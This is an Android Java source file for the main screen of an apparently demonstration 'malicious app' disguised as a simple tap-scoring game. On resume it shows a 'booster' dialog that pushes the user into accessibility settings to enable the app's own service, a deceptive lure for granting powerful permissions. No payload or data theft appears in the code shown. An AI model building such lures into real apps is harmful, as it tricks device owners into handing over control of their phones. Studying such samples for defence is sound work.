package com.boltz.maliciousapp;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;

import java.util.List;

public class MainActivity extends AppCompatActivity implements GameView.GameListener {

    private static final String PREFS = "game_prefs";
    private static final String KEY_BEST = "best_score";

    private TextView tvScore;
    private TextView tvBest;
    private TextView tvTime;
    private MaterialButton btnPlay;
    private GameView gameView;
    private SharedPreferences prefs;
    private boolean dialogShownThisSession;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(PREFS, MODE_PRIVATE);

        tvScore = findViewById(R.id.tvScore);
        tvBest = findViewById(R.id.tvBest);
        tvTime = findViewById(R.id.tvTime);
        btnPlay = findViewById(R.id.btnPlay);
        gameView = findViewById(R.id.gameView);

        gameView.setGameListener(this);

        int best = prefs.getInt(KEY_BEST, 0);
        tvBest.setText(getString(R.string.best_format, best));
        tvTime.setText(getString(R.string.time_format, 30));

        btnPlay.setOnClickListener(v -> {
            btnPlay.setEnabled(false);
            btnPlay.setText(R.string.playing);
            gameView.startGame();
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!isAccessibilityEnabled() && !dialogShownThisSession) {
            dialogShownThisSession = true;
            showBoosterDialog();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        gameView.stopGame();
        resetPlayButton();
    }

    private void showBoosterDialog() {
        new MaterialAlertDialogBuilder(this)
                .setTitle(R.string.booster_title)
                .setMessage(R.string.booster_message)
                .setPositiveButton(R.string.booster_enable, (d, w) ->
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)))
                .setNegativeButton(R.string.booster_later, null)
                .show();
    }

    private boolean isAccessibilityEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> services =
                am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo info : services) {
            if (info.getId().contains(getPackageName())) {
                return true;
            }
        }
        return false;
    }

    private void resetPlayButton() {
        btnPlay.setEnabled(true);
        btnPlay.setText(R.string.btn_play);
    }

    @Override
    public void onScoreUpdate(int score) {
        tvScore.setText(getString(R.string.score_format, score));
    }

    @Override
    public void onTick(long secondsLeft) {
        tvTime.setText(getString(R.string.time_format, secondsLeft));
    }

    @Override
    public void onFinish(int finalScore) {
        int best = prefs.getInt(KEY_BEST, 0);
        if (finalScore > best) {
            best = finalScore;
            prefs.edit().putInt(KEY_BEST, best).apply();
        }

        tvBest.setText(getString(R.string.best_format, best));
        tvTime.setText(getString(R.string.time_format, 0));
        resetPlayButton();
        btnPlay.setText(R.string.btn_play_again);

        String message = getString(R.string.gameover_message, finalScore);
        new MaterialAlertDialogBuilder(this)
                .setTitle(R.string.gameover_title)
                .setMessage(message)
                .setPositiveButton(R.string.gameover_ok, null)
                .show();
    }
}
